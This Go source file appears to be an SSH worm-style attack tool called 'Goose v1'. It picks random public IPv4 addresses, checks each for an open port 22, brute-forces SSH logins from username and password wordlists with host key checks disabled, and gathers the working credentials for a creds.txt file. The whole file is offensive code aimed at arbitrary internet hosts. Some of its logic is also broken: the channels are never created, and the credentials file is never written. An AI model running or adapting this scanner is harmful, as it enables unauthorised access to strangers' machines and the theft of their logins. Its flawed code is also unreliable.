package main

import (
	//"strconv"
	"time"
	"fmt"
	"math/rand"
	"os"
	"bufio"
	//"bytes"
	"net"
	"golang.org/x/crypto/ssh"
	//"github.com/inancgumus/screen"
	//"github.com/sfreiberg/simplessh"
)

type cred struct {
	url      string
	port     int
	username string
	password string
}

type creds []*cred

func readFile(f string) (data []string, err error) {
    b, err := os.Open(f)
    if err != nil {
        return
    }
    defer b.Close()
    scanner := bufio.NewScanner(b)
    for scanner.Scan() {
        data = append(data, scanner.Text())
    }
    return
}

func randRange(min, max int) int {
    return rand.Intn(max-min) + min
}

//this functions attempts to open an SSH connection with the target IP, using a username and password
func sshConnect(ip, username, password string) bool {
	fmt.Println("Attempting to connect to " + ip + " with " + username + ":" + password + "...")
	sshConfig := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	conn, err := ssh.Dial("tcp", ip+":22", sshConfig)
	time.Sleep(100 * time.Millisecond)
	if err == nil {
		conn.Close()
		fmt.Println("Success!")
		time.Sleep(100 * time.Millisecond)
		return true
	}
	fmt.Println("Failed!")
	time.Sleep(100 * time.Millisecond)
	return false
}

//this function checks if an IP has port 22 open
func sshScan(ip string) bool {
	fmt.Println("Scanning " + ip + "...")
	conn, err := net.DialTimeout("tcp", ip+":22", 15*time.Second)
	time.Sleep(100 * time.Millisecond)
	if err == nil {
		conn.Close()
		fmt.Println("Success! Port 22 is open on " + ip)
		time.Sleep(100 * time.Millisecond)
		return true
	}
	fmt.Println("Failed!")
	time.Sleep(100 * time.Millisecond)
	return false
}

//this function attempts to connect to the target IP with all possible combinations of usernames and passwords, provided by two list files
func sshBrute(ch chan *cred, ip, usernameList, passwordList string) {
	fmt.Println("Brute-forcing " + ip + "...")
	userlist, err := readFile(usernameList)
	if err != nil {
		fmt.Println(err)
	}
	passlist, err := readFile(passwordList)
	if err != nil {
		fmt.Println(err)
	}
	for _, username := range userlist {
		for _, password := range passlist {
			if sshConnect(ip, username, password) {
				//this code will put the credentials in the channel
				ch <- &cred{url: ip, port: 22, username: username, password: password}
				fmt.Println("Success! Credentials found: " + username + ":" + password + " on " + ip)
				time.Sleep(100 * time.Millisecond)
			}
		}
	}
	fmt.Println("Failed!")
	time.Sleep(100 * time.Millisecond)
}

//this function generates a random valid IPv4 address
func genAddress() string {
	rand.Seed(time.Now().UnixNano())
	ip := fmt.Sprintf("%d.%d.%d.%d", randRange(1, 254), randRange(1, 254), randRange(1, 254), randRange(1, 254))
	return ip
}

func main() {
	//adds some FLAVOR to the startup
	ascii := "✩░▒▓▆▅▃▂▁𝐆𝐨𝐨𝐬𝐞 𝐯𝟏▁▂▃▅▆▓▒░✩"
	fmt.Println(ascii)
	
	max_threads := 10
	current_threads := 0
	channels := make([]chan *cred, max_threads)
	max_creds := 2

	for {
		if len(channels) == max_creds {
			break
		}

		for {
			addr := genAddress()
			if !sshScan(addr) || current_threads == max_threads {
				break
			}
			current_threads += 1
			go sshBrute(channels[current_threads-1], addr, "user.txt", "pass.txt")
			fmt.Println(channels[current_threads-1])
		}	
	}

	//this code writes the results of the brute-forcing to a file
	var creds []*cred
	for i := 0; i < max_threads; i++ {
		creds = append(creds, <-channels[i])
	}
	file, err := os.Create("creds.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()
}
